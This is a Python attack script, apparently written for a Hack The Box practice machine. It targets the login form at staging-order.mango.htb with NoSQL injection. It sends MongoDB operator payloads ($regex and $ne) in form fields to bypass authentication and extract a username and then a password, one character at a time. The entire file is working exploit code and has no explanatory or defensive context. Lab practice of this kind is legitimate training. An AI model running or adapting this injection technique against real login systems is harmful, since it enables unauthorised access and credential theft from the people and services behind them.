import requests
import string
import sys

headers = {
    'Host': 'staging-order.mango.htb',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Content-Length': '48',
    'Origin': 'http://staging-order.mango.htb',
    'Connection': 'close',
    'Referer': 'http://staging-order.mango.htb/',
    'Upgrade-Insecure-Requests': '1',
}

forbidden_chars = ["*", "+", ".", "?", "|", "\\", "&", "^", "$"]

ing = ['—', '\\', '|', '/']

def brute_password(username):

    payload = ""
    over = False
    while not over:

        for c in string.printable:
            # if c is these special chars, continue
            if c in forbidden_chars:
                    continue
            
            payload0 = payload + c
            data = f'username={username}&password[$regex]=^{payload0}.*&login=login'
            response = requests.post('http://staging-order.mango.htb/', headers=headers, data=data, verify=False)
            sys.stdout.write(f"\r[*] Brute forcing password: {payload+c}")
            sys.stdout.flush()
            
            if "admin@mango.htb" in response.text:
                payload += c
                break
        else:
            over = True
            
    print(f"\r[!] Found the password: {payload}")


def brute_username(username):

    found = False
    for c in string.printable:
        if c in forbidden_chars:
            continue

        payload = username + c
        data = f'username[$regex]=^{payload}.*&password[$ne]=1&login=login'
        response = requests.post('http://staging-order.mango.htb/', headers=headers, data=data, verify=False)
        sys.stdout.write(f"\r[*] Brute forcing username: {payload}")
        sys.stdout.flush()

        if "admin@mango.htb" in response.text:
            found = True
            brute_username(payload)
    
    if not found:
        print(f"\r[!] Found the username: {username}")
        brute_password(username)
        

if __name__ == "__main__":
    brute_username("")
